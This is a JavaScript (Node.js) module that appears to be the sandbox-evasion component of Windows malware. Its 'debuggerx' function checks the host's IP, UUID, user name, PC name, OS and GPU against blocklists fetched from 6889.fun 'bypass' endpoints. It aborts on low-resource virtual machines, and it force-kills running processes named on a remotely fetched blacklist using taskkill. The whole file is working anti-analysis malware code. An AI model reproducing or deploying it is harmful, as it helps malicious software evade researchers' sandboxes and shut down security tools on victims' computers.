const util = require("util");
const fetch = require('sync-fetch');
const process = require("process");
const exec = util.promisify(require("child_process").exec);

async function debuggerx(enable, ip, disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion) {
    if (enable === "no") return;
    try {
        const [
            pc_name,
            user_name
        ] = [
                process.env.COMPUTERNAME || "Not found",
                process.env.USERNAME || "Not found"
            ]
        const [
            isBlockedIP,
            isBlockedUID,
            isBlockedUsername,
            isBlockedPCName,
            isBlockedOS,
            isBlockedGpu,
        ] = await Promise.all([
            ipBlocked(ip),
            uuidBlocked(uid),
            usernameBlocked(user_name),
            pcNameBlocked(pc_name),
            osBlocked(os),
            gpuBlocked(gpu),
        ]);

        if (
            (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2)
            || (!isNaN(cpucount) && cpucount < 2)
            || isBlockedGpu
            || isBlockedOS
            || isBlockedIP
            || isBlockedUID
            || isBlockedUsername
            || isBlockedPCName
        ) {
            process.abort();
        }

        try {
            await killBlacklisted();
        } catch (e) {
            console.error(e);
        }
    } catch (e) {
        console.error(e);
    }
}

async function killBlacklisted() {
    try {
        const r = await fetch("https://6889.fun/api/aurathemes/bypass/blacklist/progr?aurathemes=true").json();
        const bp = r.blacklistedprog;
        const { stdout } = await exec("tasklist");
        const rp = stdout.split(/\r?\n/);
        for (const p of rp) {
            const pn = p.split(/\s+/)[0].replace(".exe", "");
            if (
                pn.toLowerCase() !== "cmd" &&
                bp.includes(pn)
            ) {
                try {
                    await exec(`taskkill /F /IM ${pn}.exe`);
                } catch (e) {
                  // console.error(e);
                }
            }
        }
    } catch (e) {
        console.error(e);
    }
}

async function gpuBlocked(_) {
    return await isBlocked(
        "https://6889.fun/api/aurathemes/bypass/blocked/gpus?aurathemes=true",
        _,
    );
}

async function osBlocked(_) {
    return await isBlocked(
        "https://6889.fun/api/aurathemes/bypass/blocked/oss?aurathemes=true",
        _,
    );
}

async function pcNameBlocked(_) {
    return await isBlocked(
        "https://6889.fun/api/aurathemes/bypass/blocked/pcnames?aurathemes=true",
        _,
    );
}

async function usernameBlocked(_) {
    return await isBlocked(
        "https://6889.fun/api/aurathemes/bypass/blocked/progr?aurathemes=true",
        _,
    );
}

async function uuidBlocked(_) {
    return await isBlocked(
        "https://6889.fun/api/aurathemes/bypass/blocked/uuids?aurathemes=true",
        _,
    );
}

async function ipBlocked(_) {
    return await isBlocked(
        "https://6889.fun/api/aurathemes/bypass/blocked/ips?aurathemes=true",
        _,
    );
}


function isBlocked(u, v) {
  try {
    const r = fetch(u);
    const _ = r.text();
    return _.includes(v);
  } catch (e) {
    console.error(e);
    return false;
  }
}


module.exports = {
    debuggerx,
};
